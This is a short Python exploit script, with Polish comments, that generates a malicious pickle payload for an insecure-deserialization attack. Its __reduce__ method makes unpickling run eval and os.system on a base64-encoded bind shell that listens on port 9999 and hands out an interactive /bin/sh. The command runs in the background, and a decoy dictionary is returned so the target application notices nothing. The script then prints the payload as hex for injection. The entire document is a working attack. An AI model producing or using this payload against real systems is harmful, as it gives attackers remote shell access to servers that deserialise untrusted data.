import pickle
import base64

class RCE(dict):
    def __reduce__(self):
        # Twój czysty kod bind shella (bez martwienia się o cudzysłowy)
        bind_shell = """import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",9999))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""
        
        # Zakoduj do Base64
        b64_shell = base64.b64encode(bind_shell.encode()).decode()
        
        # Komenda dekodująca i uruchamiająca Pythona w tle
        cmd = f"echo {b64_shell} | base64 -d | python3"
        background_cmd = f"__import__('os').system('{cmd} &')"
        
        return (eval, (f"({background_cmd}, {{'user': 'root', 'revenue': '85000'}})[1]",))

print(pickle.dumps(RCE()).hex())
